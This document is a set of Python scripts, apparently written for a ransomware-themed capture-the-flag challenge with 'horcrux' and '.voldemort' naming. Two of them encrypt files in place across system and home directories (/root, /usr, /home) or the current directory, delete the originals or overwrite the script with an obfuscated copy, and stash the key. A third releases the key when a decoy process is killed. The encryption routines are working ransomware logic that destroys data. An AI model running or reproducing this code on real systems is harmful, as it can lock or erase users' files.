import os
import sys
import base64
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from multiprocessing import Process

def generate_key():
    salt = os.urandom(16)
    password = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key, salt, password

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

def process_files(directories, excluded_files, key):
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file not in excluded_files:
                        encrypt_file(os.path.join(root, file), key)

def hide_key_file(key_file_path):
    while True:
        pass

def reverse_and_obfuscate_script(script_path):
    with open(script_path, "r") as f:
        script = f.read()
    reversed_script = script[::-1]
    shuffled = list(reversed_script)
    random.shuffle(shuffled)
    index_map = {i: shuffled.index(char) for i, char in enumerate(reversed_script)}
    obfuscated_script = "".join(shuffled)
    encoded_script = base64.b64encode(obfuscated_script.encode()).decode()
    with open(script_path, "w") as f:
        f.write(encoded_script + "-f{" + ",".join(map(str, index_map.values())) + "}")

def main():
    key, salt, password = generate_key()
    key_file_path = "keyfile"
    excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
    target_folders = ["/root", "/usr", "/home", "/Documents", "/Downloads", "/var/gui"]
    
    with open(key_file_path, "wb") as f:
        f.write(key)
    
    parent_process = Process(target=hide_key_file, args=(key_file_path,))
    parent_process.start()
    
    process_files(target_folders, excluded_files, key)
    reverse_and_obfuscate_script(sys.argv[0])
    
    with open("/tmp/.flag.txt", "w") as f:
        f.write("Challenge Completed")

if __name__ == "__main__":
    main()



```
import os
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Constants
KEY_SIZE = 8  # 64-bit
BLOCK_SIZE = 16
ENC_EXT = ".voldemort"

# Padding helpers
def pad(data):
    pad_len = BLOCK_SIZE - len(data) % BLOCK_SIZE
    return data + bytes([pad_len] * pad_len)

def encrypt_file(file_path, cipher):
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted_data = cipher.encrypt(pad(data))
    with open(file_path + ENC_EXT, 'wb') as f:
        f.write(encrypted_data)
    os.remove(file_path)

def generate_key():
    raw_key = get_random_bytes(KEY_SIZE)
    padded_key = raw_key.ljust(BLOCK_SIZE, b'\0')  # AES-128 requires 16 bytes
    return raw_key, padded_key

def encrypt_directory(root_path, cipher):
    for foldername, subfolders, filenames in os.walk(root_path):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            # Avoid encrypting already encrypted or hidden files
            if not file_path.endswith(ENC_EXT) and not filename.startswith('.'):
                try:
                    encrypt_file(file_path, cipher)
                    print(f"[+] Encrypted: {file_path}")
                except Exception as e:
                    print(f"[-] Skipped (Error): {file_path} — {e}")

def main():
    print("[*] Generating AES-128 key...")
    raw_key, aes_key = generate_key()

    cipher = AES.new(aes_key, AES.MODE_ECB)

    print("[*] Encrypting all files under current directory...")
    encrypt_directory(os.getcwd(), cipher)

    # Store base64 key for next step
    encoded_key = base64.b64encode(raw_key).decode()
    with open("temp_horcrux_key.txt", "w") as f:
        f.write(encoded_key)
    
    print(f"[✔] Encryption complete. Base64 Key stored temporarily.")

if __name__ == "__main__":
    main()

```


### 2 

import os
import subprocess
import base64
import signal
import time

KEY_FILE_TMP = "temp_horcrux_key.txt"
RESTORE_PATH = "/tmp/horcrux"
PROCESS_NAME = "horcrux"

def read_key():
    with open(KEY_FILE_TMP, "r") as f:
        return f.read()

def restore_key(encoded_key):
    with open(RESTORE_PATH, "w") as f:
        f.write(encoded_key)
    print(f"[✔] Key restored to {RESTORE_PATH}")

def main():
    encoded_key = read_key()

    print("[*] Starting Horcrux process to guard the key...")

    # Start dummy long process (simulate 'horcrux' process)
    proc = subprocess.Popen(["sleep", "9999"])
    pid = proc.pid

    print(f"[+] Horcrux PID: {pid} (kill this to release the key)")

    # Remove the file from disk
    os.remove(KEY_FILE_TMP)

    try:
        # Monitor process
        while True:
            ret = proc.poll()
            if ret is not None:
                print("[!] Horcrux process killed.")
                restore_key(encoded_key)
                break
            time.sleep(2)

    except KeyboardInterrupt:
        print("[!] Interrupted manually.")
        proc.kill()
        restore_key(encoded_key)

if __name__ == "__main__":
    main()

